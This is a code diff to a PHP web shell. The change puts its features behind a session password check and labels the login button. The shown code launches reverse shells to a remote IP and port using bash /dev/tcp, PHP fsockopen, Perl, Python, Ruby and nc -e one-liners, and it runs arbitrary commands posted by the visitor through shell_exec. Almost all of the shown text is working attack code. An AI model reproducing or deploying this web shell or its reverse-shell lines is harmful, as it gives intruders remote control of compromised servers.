@@ -16,21 +16,25 @@ function getbins() {
 }
 if ($_SERVER["REQUEST_METHOD"] == "GET") {
     if (isset($_GET["shelltype"])) {
-        if (strlen($default_ip) > 0) {
-            echo "Sending to default ip $default_ip <br>";
-            $ip = $default_ip;
+        if ($_SESSION['admin'] == "admin") {
+            if (strlen($default_ip) > 0) {
+                echo "Sending to default ip $default_ip <br>";
+                $ip = $default_ip;
+            } else {
+                echo "Automatic Detection ". $_SERVER["REMOTE_ADDR"];
+                $ip = $_SERVER["REMOTE_ADDR"];
+            }
+            $shelltype = $_GET["shelltype"];
+            if ($shelltype == "bash") { system("bash -c 'bash -i >& /dev/tcp/$ip/$default_port 0>&1'"); } 
+            elseif ($shelltype == "php") { system("php -r '\$sock=fsockopen(\"$ip\",$default_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"); }
+            elseif ($shelltype == "perl") { system("perl -e 'use Socket;\$i=\"$ip\";\$p=$default_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"); }
+            elseif ($shelltype == "python") { system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$default_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"); }
+            elseif ($shelltype == "python3") { system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$default_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"); }
+            elseif ($shelltype == "ruby") { system("ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$default_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"); }
+            elseif ($shelltype == "nc") { system("nc -e /bin/sh $ip $default_port"); }
         } else {
-            echo "Automatic Detection ". $_SERVER["REMOTE_ADDR"];
-            $ip = $_SERVER["REMOTE_ADDR"];
+            echo "! YOU MUST AUTHENTICATE FOR THIS ACTION !";
         }
-        $shelltype = $_GET["shelltype"];
-        if ($shelltype == "bash") { system("bash -c 'bash -i >& /dev/tcp/$ip/$default_port 0>&1'"); } 
-        elseif ($shelltype == "php") { system("php -r '\$sock=fsockopen(\"$ip\",$default_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"); }
-        elseif ($shelltype == "perl") { system("perl -e 'use Socket;\$i=\"$ip\";\$p=$default_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"); }
-        elseif ($shelltype == "python") { system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$default_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"); }
-        elseif ($shelltype == "python3") { system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$default_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"); }
-        elseif ($shelltype == "ruby") { system("ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$default_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"); }
-        elseif ($shelltype == "nc") { system("nc -e /bin/sh $ip $default_port"); }
     }
 }
 ?>
@@ -59,7 +63,7 @@ if ($_SESSION["admin"] != "admin") {
         <h1>Authentication Required</h1>
         <form action=\"\" method=\"post\">
             <input type=\"password\" name=\"passwd\">
-            <input type=\"submit\">
+            <input type=\"submit\" value=\"login\">
         </form>
     </div>
     </body>
@@ -83,20 +87,21 @@ if ($_SESSION["admin"] != "admin") {
         <?php
         if ($_SERVER["REQUEST_METHOD"] == "POST") {
             if (isset($_POST["cmd"])) {
-                if (PHP_OS == "WINNT" || PHP_OS == "Windows" || PHP_OS == "WIN32") {
-                    $cmdout = shell_exec($_POST["cmd"]);
-                    $cmdout = explode("\r\n", $cmdout);
-                    foreach ($cmdout as $i) {
-                        echo $i."<br>";
-                    } 
-                } else {
-                    $cmdout = shell_exec($_POST["cmd"]);
-                    $cmdout = explode("\n", $cmdout);
-                    foreach ($cmdout as $i) {
-                        echo $i."<br>";
+                if ($_SESSION["admin"] == "admin") {
+                    if (PHP_OS == "WINNT" || PHP_OS == "Windows" || PHP_OS == "WIN32") {
+                        $cmdout = shell_exec($_POST["cmd"]);
+                        $cmdout = explode("\r\n", $cmdout);
+                        foreach ($cmdout as $i) {
+                            echo $i."<br>";
+                        } 
+                    } else {
+                        $cmdout = shell_exec($_POST["cmd"]);
+                        $cmdout = explode("\n", $cmdout);
+                        foreach ($cmdout as $i) {
+                            echo $i."<br>";
+                        }
                     }
-                }
-                
+                }    
             }
         }
         ?>
